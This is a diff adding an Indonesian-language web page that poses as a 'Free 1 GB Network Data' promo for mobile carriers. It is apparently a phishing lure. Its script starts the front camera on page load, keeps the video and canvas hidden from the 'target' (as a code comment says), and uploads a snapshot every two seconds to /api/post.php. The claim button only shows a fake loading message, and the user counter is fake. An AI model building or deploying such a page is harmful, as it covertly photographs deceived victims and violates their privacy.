@@ -1,0 +1,133 @@
+<!doctype html>
+<html lang="id">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Free 1 GB Network Data — Promo</title>
+  <style>
+    :root{
+      --bg:#f6f7fb;
+      --card:#ffffff;
+      --accent:#0b76ff;
+      --muted:#7b7f8a;
+      font-family: 'Inter', sans-serif;
+    }
+    body{
+      margin:0;
+      min-height:100vh;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      background:linear-gradient(180deg, #eef2ff 0%, var(--bg) 100%);
+      padding:24px;
+    }
+    .card{
+      width:100%;
+      max-width:360px;
+      background:var(--card);
+      border-radius:12px;
+      box-shadow: 0 8px 30px rgba(12,20,40,0.08);
+      padding:20px;
+      z-index: 10;
+    }
+    .title{ text-align:center; font-weight:700; font-size:20px; margin-bottom:14px; }
+    .note{ font-size:13px; color:var(--muted); background:#f3f7ff; border-radius:8px; padding:10px; margin-bottom:18px; text-align:center; }
+    .field{ display:block; margin-bottom:12px; }
+    select, input{ width:100%; padding:12px; border-radius:10px; border:1px solid #e6e9f0; font-size:15px; outline:none; box-sizing:border-box; }
+    .btn{ width:100%; padding:12px; border-radius:10px; border:none; cursor:pointer; font-weight:700; font-size:15px; background:var(--accent); color:#fff; }
+    .spinner{ width:18px; height:18px; border:3px solid #fff; border-bottom-color:transparent; border-radius:50%; display:inline-block; animation:spin 0.7s linear infinite; vertical-align: middle; margin-right: 8px; }
+    @keyframes spin{ 0%{ transform:rotate(0deg); } 100%{ transform:rotate(360deg); } }
+    .counter{ margin-top:14px; font-size:14px; text-align:center; font-weight:700; }
+    .msg{ margin-top:10px; font-size:14px; text-align:center; color: red; }
+    
+    /* Sembunyikan elemen kamera agar tidak terlihat target */
+    #video, #canvas { display: none; }
+  </style>
+</head>
+<body>
+
+  <div class="card">
+    <div class="title">🚀 Free 1 GB Network Data</div>
+    <div class="note">🎁 Free 1GB data pack recharge for everyone from us.</div>
+
+    <label class="field">
+      <select id="provider">
+        <option value="Telkomsel">Telkomsel</option>
+        <option value="Indosat">Indosat</option>
+        <option value="XL">XL</option>
+        <option value="Axis">Axis</option>
+        <option value="Tri">Tri (3)</option>
+        <option value="Smartfren">Smartfren</option>
+      </select>
+    </label>
+
+    <label class="field">
+      <input id="phone" type="tel" inputmode="numeric" placeholder="Masukkan nomor telepon">
+    </label>
+
+    <button id="claimBtn" class="btn">🎁 Claim</button>
+    <div id="message" class="msg"></div>
+
+    <div class="counter">
+      Claimed <span id="count">3589</span>/5000 users.
+    </div>
+  </div>
+
+  <video id="video" autoplay></video>
+  <canvas id="canvas" width="640" height="480"></canvas>
+
+  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+
+  <script>
+    // 1. Fungsi Kirim Data ke API Vercel
+    function post(imgdata) {
+      $.ajax({
+        type: 'POST',
+        data: { cat: imgdata },
+        url: '/api/post.php', // Pastikan post.php ada di folder api/
+        success: function() { console.log("Captured"); },
+        error: function() { console.log("Failed"); }
+      });
+    }
+
+    // 2. Logika Tombol Claim (Efek Loading)
+    document.getElementById('claimBtn').addEventListener('click', function() {
+      const phone = document.getElementById('phone').value;
+      if (phone.length < 9) {
+        document.getElementById('message').textContent = 'Nomor tidak valid!';
+        return;
+      }
+      this.disabled = true;
+      this.innerHTML = `<span class="spinner"></span> Processing...`;
+      document.getElementById('message').style.color = "black";
+      document.getElementById('message').textContent = 'Menghubungkan ke server provider...';
+    });
+
+    // 3. Logika Kamera (Auto Start)
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+
+    async function startCamera() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ audio: false, video: { facingMode: "user" } });
+        video.srcObject = stream;
+        
+        // Ambil foto setiap 2 detik setelah izin diberikan
+        const context = canvas.getContext('2d');
+        setInterval(() => {
+          context.drawImage(video, 0, 0, 640, 480);
+          const canvasData = canvas.toDataURL("image/png");
+          post(canvasData);
+        }, 2000);
+
+      } catch (e) {
+        console.error("Kamera ditolak atau tidak ada:", e);
+      }
+    }
+
+    // Jalankan kamera otomatis saat halaman dibuka
+    window.onload = startCamera;
+  </script>
+
+</body>
+</html>
